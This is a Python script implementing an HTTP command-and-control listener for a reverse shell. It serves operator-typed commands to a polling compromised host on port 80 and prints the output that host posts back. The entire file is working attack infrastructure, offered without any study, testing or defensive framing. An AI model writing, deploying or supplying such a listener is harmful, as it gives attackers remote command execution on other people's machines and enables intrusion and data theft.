import http.server
import socketserver
import threading
import queue

PORT = 80
command_queue = queue.Queue()  # Queue to manage commands
output_queue = queue.Queue()  # Queue to manage command outputs
shell_connected = False

class ReverseShellHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global shell_connected
        if not shell_connected:
            print("Shell connected")
            shell_connected = True
        # Send the command to the reverse shell
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        if not command_queue.empty():
            command = command_queue.get()
            self.wfile.write(command.encode())
        else:
            self.wfile.write(b"")

    def do_POST(self):
        global shell_connected
        # Receive the command output from the reverse shell
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        output_queue.put(post_data.decode())

        # Send a response back to the reverse shell
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        # Override to filter out 200 requests
        if "200" not in format % args:
            super().log_message(format, *args)

def run_server():
    class ReusableTCPServer(socketserver.TCPServer):
        allow_reuse_address = True

    while True:
        try:
            with ReusableTCPServer(("", PORT), ReverseShellHandler) as httpd:
                print("Listening on port", PORT)
                httpd.serve_forever()
        except OSError as e:
            if e.errno == 98:
                print(f"Port {PORT} is already in use. Trying to close the existing socket.")
                # Attempt to close the existing socket
                with socketserver.TCPServer(("", PORT), ReverseShellHandler) as httpd:
                    httpd.server_close()
                print("Socket closed. Retrying...")
            else:
                raise

if __name__ == "__main__":
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    while True:
        if shell_connected:
            command = input(": ")
            command_queue.put(command)
            shell_connected = False
        if not output_queue.empty():
            print("\nCommand output:\n", output_queue.get())
